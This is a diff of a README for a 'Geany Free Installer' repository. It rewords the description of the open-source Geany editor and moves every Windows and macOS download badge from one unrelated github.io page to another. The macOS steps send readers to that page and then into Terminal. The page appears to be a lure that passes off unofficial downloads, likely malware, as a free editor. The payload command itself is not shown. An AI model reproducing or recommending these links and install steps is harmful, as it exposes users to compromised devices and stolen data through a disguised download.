@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Text+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Geany Free Installer** — Geany is a lightweight, fast, open-source text editor and basic IDE for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 Geany Free Installer** — Geany is a free, lightweight text editor and IDE for Windows, macOS, and Linux using GTK. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Geany](https://img.shields.io/badge/⬇_Install_Geany-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Geany](https://img.shields.io/badge/⬇_Install_Geany-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Geany
 
-Geany is a lightweight, fast, open-source text editor and basic IDE for Windows, macOS, and Linux. Built on GTK, Geany supports syntax highlighting for 50+ languages, code navigation, auto-completion, build system integration, and a plugin system. Its small resource footprint and fast startup make it an excellent choice for older hardware or developers who want a capable editor without heavyweight dependencies.
+Geany is a free, lightweight text editor and IDE for Windows, macOS, and Linux using GTK. It provides syntax highlighting for 50+ languages, code completion, build system integration, plugin support, and a project manager — offering IDE features without heavy resource use.
 
 ---
 
 ## ❌ Problem: Geany is hard to access
 
-- **UI Design** — Interface appears dated compared to modern editors
-- **Plugin Quality** — Community plugin quality and maintenance varies significantly
-- **Advanced IDE Features** — Less powerful for complex refactoring than full IDEs
-- **Windows GTK** — Windows version carries GTK dependency overhead
+- **GTK Interface** — Less native-feeling on Windows and macOS than on Linux
+- **Limited Advanced Features** — Missing modern IDE features like intelligent refactoring
+- **Plugin Ecosystem** — Smaller than VS Code or Eclipse
+- **Language Server Protocol** — LSP support added but less mature than VS Code integration
 
 ---
 
@@ -61,9 +61,9 @@ Geany is a lightweight, fast, open-source text editor and basic IDE for Windows,
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Geany is a lightweight, fast, open-source text editor and basic IDE for Windows,
 
 <div align="center">
 
-[![⬇ Install Geany](https://img.shields.io/badge/⬇_Install_Geany-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Geany](https://img.shields.io/badge/⬇_Install_Geany-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Geany is a lightweight, fast, open-source text editor and basic IDE for Windows,
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Geany is a lightweight, fast, open-source text editor and basic IDE for Windows,
 
 ---
 
-**Geany Free Installer** — Geany is a lightweight, fast, open-source text editor and basic IDE for Windows, macOS, and Linux. Install without internet connection today!
+**Geany Free Installer** — Geany is a free, lightweight text editor and IDE for Windows, macOS, and Linux using GTK. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Geany](https://img.shields.io/badge/⬇_Install_Geany-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Geany](https://img.shields.io/badge/⬇_Install_Geany-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
